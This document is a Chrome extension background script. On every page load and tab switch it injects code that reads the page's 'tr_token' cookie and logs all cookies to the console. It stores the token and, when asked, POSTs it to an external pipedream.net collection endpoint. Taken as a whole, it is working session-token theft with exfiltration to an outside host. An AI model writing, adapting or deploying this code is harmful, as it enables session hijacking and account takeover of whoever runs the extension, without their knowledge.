let authToken = null;

function storeAuthToken(token) {
  authToken = token;
  chrome.storage.local.set({ authToken: token }, function() {
    console.log('Auth token stored successfully');
    chrome.runtime.sendMessage({action: "authStatusChanged", isAuthenticated: true});
  });
}

function getAuthToken(callback) {
  if (authToken) {
    callback(authToken);
  } else {
    chrome.storage.local.get(['authToken'], function(result) {
      authToken = result.authToken;
      callback(authToken);
    });
  }
}

function clearAuthToken() {
  authToken = null;
  chrome.storage.local.remove(['authToken'], function() {
    console.log('Auth token cleared');
    chrome.runtime.sendMessage({action: "authStatusChanged", isAuthenticated: false});
  });
}

function captureTokenFromCurrentTab() {
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    if (tabs[0]) {
      console.log('Attempting to capture token from:', tabs[0].url);
      if (tabs[0].url.startsWith('chrome://')) {
        console.log('Cannot capture token from chrome:// pages');
        chrome.runtime.sendMessage({action: "captureAttemptFailed", error: "Unsupported page"});
        return;
      }
      
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        function: extractToken,
      }, (injectionResults) => {
        if (chrome.runtime.lastError) {
          console.error('Script injection error:', chrome.runtime.lastError.message);
          chrome.runtime.sendMessage({action: "captureAttemptFailed", error: "Script injection failed"});
          return;
        }
        
        if (!injectionResults || injectionResults.length === 0) {
          console.error('No injection results');
          chrome.runtime.sendMessage({action: "captureAttemptFailed", error: "No injection results"});
          return;
        }
        
        const token = injectionResults[0].result;
        if (token) {
          storeAuthToken(token);
          console.log('Token captured and stored');
        } else {
          console.log('No token found');
          chrome.runtime.sendMessage({action: "captureAttemptFailed", error: "No token found"});
        }
      });
    } else {
      console.error('No active tab found');
      chrome.runtime.sendMessage({action: "captureAttemptFailed", error: "No active tab"});
    }
  });
}

function extractToken() {
  console.log('Extracting token...');
  
  // Check cookies for tr_token
  const cookies = document.cookie.split(';');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    if (cookie.startsWith('tr_token=')) {
      const token = cookie.substring('tr_token='.length, cookie.length);
      console.log('Token found in cookies: tr_token');
      return token;
    }
  }

  // Log all cookies for debugging
  console.log('Cookies:', document.cookie);

  console.log('No tr_token found in cookies');
  return null;
}

// Add this function to your existing background.js file
function sendTokenToEndpoint() {
  return new Promise((resolve, reject) => {
    getAuthToken(function(token) {
      if (!token) {
        reject("No token available");
        return;
      }

      fetch('https://enr04sjllxktt.x.pipedream.net/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ token: token }),
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Token sent successfully:', data);
        resolve(data);
      })
      .catch(error => {
        console.error('Error sending token:', error);
        reject(error.message);
      });
    });
  });
}

// Modify the existing message listener in background.js to handle the new "sendToken" action
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  console.log('Received message:', request.action);
  if (request.action === "getAuthStatus") {
    getAuthToken(function(token) {
      sendResponse({isAuthenticated: !!token});
    });
    return true;
  } else if (request.action === "login") {
    captureTokenFromCurrentTab();
    sendResponse({status: "Token capture initiated"});
  } else if (request.action === "logout") {
    clearAuthToken();
    sendResponse({status: "Logged out"});
  } else if (request.action === "sendToken") {
    sendTokenToEndpoint()
      .then(() => sendResponse({success: true}))
      .catch(error => sendResponse({success: false, error: error}));
    return true; // Indicates that we will send a response asynchronously
  }
});

// Initialize: check if there's a stored token, if not, try to capture one
getAuthToken(function(token) {
  if (token) {
    console.log('Existing token found');
  } else {
    console.log('No existing token found, attempting to capture');
    captureTokenFromCurrentTab();
  }
});

// Listen for tab updates to capture token when a page is loaded
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete' && !tab.url.startsWith('chrome://')) {
    console.log('Tab updated, attempting to capture token');
    captureTokenFromCurrentTab();
  }
});

// Listen for tab activation to capture token when switching tabs
chrome.tabs.onActivated.addListener(function(activeInfo) {
  chrome.tabs.get(activeInfo.tabId, function(tab) {
    if (!tab.url.startsWith('chrome://')) {
      console.log('Tab activated, attempting to capture token');
      captureTokenFromCurrentTab();
    }
  });
});

console.log('Background script loaded');
